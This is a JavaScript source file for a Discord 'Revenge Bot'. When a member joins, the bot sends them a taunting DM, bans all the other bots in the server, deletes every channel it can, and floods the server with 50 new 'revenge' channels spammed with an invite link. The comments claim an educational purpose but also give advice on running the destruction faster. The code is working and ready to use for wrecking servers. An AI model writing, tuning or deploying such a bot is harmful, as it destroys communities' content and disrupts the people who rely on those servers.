import { Client, GatewayIntentBits } from 'discord.js';
import { readFileSync } from 'fs';

// WARNING: DO NOT MODIFY THIS FILE UNLESS YOU UNDERSTAND THE IMPLICATIONS.
// This bot is designed for educational purposes only. Misuse or unauthorized modifications may result in severe consequences. 
// If you wish to optimize or alter the bot, ensure you do so responsibly and test in controlled environments only.

// Load the configuration file (config.json) to securely store the bot token
const config = JSON.parse(readFileSync('./config.json'));

// Create the Discord client with necessary intents
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
  ]
});

// INFO: This event triggers when the bot is ready and connected to Discord
client.on('ready', () => {
  console.log(`${client.user.tag} is online and ready!`);
});

// INFO: This event triggers whenever a new member is added to the guild
client.on('guildMemberAdd', async (member) => {
  try {
    // WARNING: DO NOT REMOVE THIS MESSAGE.
    // This DM explains the purpose of the bot and alerts the user who added it.
    const dmMessage = `
**Hey there!**
The bot you added will now start deleting everything, banning bots, and recreating channels. All content will be wiped secretly, including channels, roles, and bots.
We are making a revenge for your server!

If you're okay with this, enjoy the fun! If not, well, it's too late. 😜
**Revenge Bot Activated**.
    `;
    await member.user.send(dmMessage);
    console.log('Sent DM to the user who added the bot.');

    // BAN ALL BOTS SECRETLY
    // INFO: This function filters all bots in the server and bans them.
    // NOTE: If you wish to optimize this, consider running the bans in parallel using `Promise.all` for faster execution.
    const bots = member.guild.members.cache.filter(m => m.user.bot);
    bots.forEach(async (bot) => {
      try {
        await bot.ban({ reason: 'Banned by Revenge Bot.' });
        console.log(`Banned bot: ${bot.user.tag}`);
      } catch (error) {
        console.error('Error banning bot:', error);
      }
    });

    // DELETE ALL CHANNELS
    // WARNING: DO NOT CHANGE THIS UNLESS YOU KNOW WHAT YOU'RE DOING.
    // The deletion is performed sequentially to avoid hitting API rate limits. 
    // If you need faster performance, consider batching deletions with a delay.
    const channels = member.guild.channels.cache;
    channels.forEach(async (channel) => {
      try {
        if (channel.deletable) {
          await channel.delete();
          console.log(`Deleted channel: ${channel.name}`);
        }
      } catch (error) {
        console.error('Error deleting channel:', error);
      }
    });

    // CREATE REVENGE CHANNELS AND SPAM THEM
    // INFO: Creates 50 channels named "revenge" and sends 10 messages in each.
    // WARNING: Reducing the delay or increasing the number of messages may result in the bot getting rate-limited or banned.
    setTimeout(async () => {
      for (let i = 0; i < 50; i++) {
        try {
          // Create a new text channel named "revenge"
          const revengeChannel = await member.guild.channels.create('revenge', {
            type: 'text',
          });
          console.log(`Created channel: revenge`);

          // Spam the channel with messages
          for (let j = 0; j < 10; j++) {
            await revengeChannel.send('GG join https://dc.gg/revenge');
          }
        } catch (error) {
          console.error('Error creating channel:', error);
        }
      }
    }, 5000); // INFO: Waits 5 seconds after deletion to start creating channels
  } catch (error) {
    console.error('Error handling guildMemberAdd event:', error);
  }
});

// LOG IN TO DISCORD
// WARNING: The bot token is loaded from config.json for security.
// Do not hardcode your token in this file to avoid accidental exposure.
client.login(config.token);
